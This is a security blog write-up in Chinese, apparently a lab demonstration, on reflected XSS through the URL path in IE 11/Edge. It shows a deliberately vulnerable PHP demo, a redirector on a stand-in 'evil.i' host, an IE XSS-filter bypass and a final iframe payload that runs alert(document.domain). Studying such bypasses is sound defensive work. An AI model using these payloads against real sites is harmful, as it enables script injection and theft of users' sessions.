<!DOCTYPE html>
<html lang="">
	<meta charset="UTF-8">
<!-- <link rel="icon" type="image/x-icon" href="/statics/img/favicon.ico"> -->
<title>
	
		bug bounty writeup - xss in url path -
	
	Symbo1
</title>

<meta name="theme-color" content="#232323">
<meta name="description" content="">
<meta name="keywords" content="">
<meta name="author" content="Tr3jer_CongRong.">
<link rel="alternate" type="application/rss+xml" title="Tr3jer_CongRong.'s RSS Feed" href="/rss.xml">
<link rel="alternate" type="application/atom+xml" title="Tr3jer_CongRong.'s Atom Feed" href="/atom.xml">
<link rel="stylesheet" type="text/css" href="/statics/css/style.css">
<link rel="license" type="text/plain" src="/statics/LICENSE">



	<body>
		<header>
	<pre class="ascii name">
  ____                        _               _ 
 / ___|   _   _   _ __ ___   | |__     ___   / |
 \___ \  | | | | | '_ ` _ \  | '_ \   / _ \  | |
  ___) | | |_| | | | | | | | | |_) | | (_) | | |
 |____/   \__, | |_| |_| |_| |_.__/   \___/  |_|
          |___/                                 
          	Security Team.
	</pre>
</header>
		<nav>
	<ul>
		<li><a href="/">Index</a></li>&nbsp;&nbsp;|
		<li><a href="/acknowledgement">Acknowledgement</a></li>&nbsp;&nbsp;|
		<li><a href="/archives">Archives</a></li>&nbsp;&nbsp;|
		<li><a href="/projects">Projects</a></li>&nbsp;&nbsp;|
		<li><a href="/members">Members</a></li>&nbsp;&nbsp;|
		<li><a href="/about">About</a></li>
		<!-- <li><a href="/rss.xml">RSS</a>/<a href="/atom.xml">Atom</a></li> -->
	</ul>
</nav>

		<main>
			<div class="post-content">
<div id="post">
  <h1 align="center">bug bounty writeup - xss in url path</h1>
<p align="right" class="date">08 Oct 2018 - L3m0n</p>

<p>漏洞点: http://lemon.i/test/xss/13.php/i_am_xss_point/i_am_xss_point/</p>

<p>Demo Code:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
header('HTTP/1.1 404 Not Found');
$path = trim($_SERVER['PATH_INFO'],"/");
$limit_pos = strrpos(trim($path,"/"),'/');
$action_name = substr($path, $limit_pos);
$controller_name = str_replace("/","\\",substr($path, 0, $limit_pos));
echo "Action: " . $action_name . " has controller: \\" . $controller_name;
?&gt;
</code></pre></div></div>

<h2 id="404头的问题">404头的问题</h2>

<p>如果404响应返回内容小于512字节，则使用IE自带的404页面</p>

<p><img src="https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgmq53r6j216y0leq7a.jpg" /></p>

<p>所以添加多个字符即可显示出来内容</p>

<p><img src="https://wx2.sinaimg.cn/mw690/9c5c5d93ly1fxqgmuvz2hj21ny0f2wpl.jpg" /></p>

<p>2、url path问题 -&gt; urlencode编码</p>

<p>浏览器下访问直接访问都会进行url编码</p>

<p><img src="https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgqon7f6j217u08cwku.jpg" /></p>

<p>但是在IE下，使用3xx跳转后可以绕过</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
header("Location: "http://".$_GET["host"]."/".urldecode($_GET["payload"]),true,302);
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&amp;payload=&lt;&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;&gt;
</code></pre></div></div>

<p><img src="https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqgmz9un3j214o08k441.jpg" /></p>

<p>但是可以看到ie filter限制了</p>

<p><img src="https://wx2.sinaimg.cn/mw690/9c5c5d93ly1fxqgn2pu2uj21o008oqat.jpg" /></p>

<h2 id="bypass-ie-filter">bypass IE filter</h2>

<p>IE edge / 11下这样利用</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe onload="contentWindow[0].location='//vulnerabledoma.in/bypass/text?q=&lt;script&gt;alert(location)&lt;/script&gt;'" src="//vulnerabledoma.in/bypass/text?q=%3Ciframe%3E"&gt;&lt;/iframe&gt;
</code></pre></div></div>

<p>所以换到目标，则payload为如下:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe src="http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&amp;payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;iframe&gt;" onload="contentWindow[0].location='http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&amp;payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;img src=1 onerror=alert(1)&gt;'"&gt;&lt;/iframe&gt;
</code></pre></div></div>

<p><img src="https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgn6ql2dj21ek0k0dpu.jpg" /></p>

<p>但是又被一些坑点限制了:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>无空格(会被url-&gt;%20)
无/(会被转换为\)
</code></pre></div></div>

<h2 id="bypass限制">bypass限制</h2>
<p>通过下面的payload可绕过</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;svg&gt;&lt;script&gt;alert(document.domain)&lt;b&gt;
</code></pre></div></div>

<p>最终payload:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe src="http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&amp;payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;iframe&gt;" onload="contentWindow[0].location='http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&amp;payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;svg&gt;&lt;script&gt;alert(document.domain)&lt;b&gt;'"&gt;&lt;/iframe&gt;
</code></pre></div></div>

<p><img src="https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqgnikd09j227y0to46b.jpg" /></p>

<h2 id="referer">Referer</h2>

<p><a target="_blank" href="https://hackerone.com/reports/311467">Reflected XSS in the IE 11 / Edge</a><br />
<a target="_blank" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser%27s-XSS-Filter-Bypass-Cheat-Sheet">Browser’s XSS Filter Bypass Cheat Sheet</a></p>

</div>
</div>

<div style="display: none;">
	<script src="https://s5.cnzz.com/z_stat.php?id=1275488238&web_id=1275488238" language="JavaScript"></script>
</div>
		</main>
		<!-- <footer>

</footer>
 -->
		<div style="display: none;">
        	<script src="https://s5.cnzz.com/z_stat.php?id=1275488238&web_id=1275488238" language="JavaScript"></script>
    	</div>
	</body>
</html>
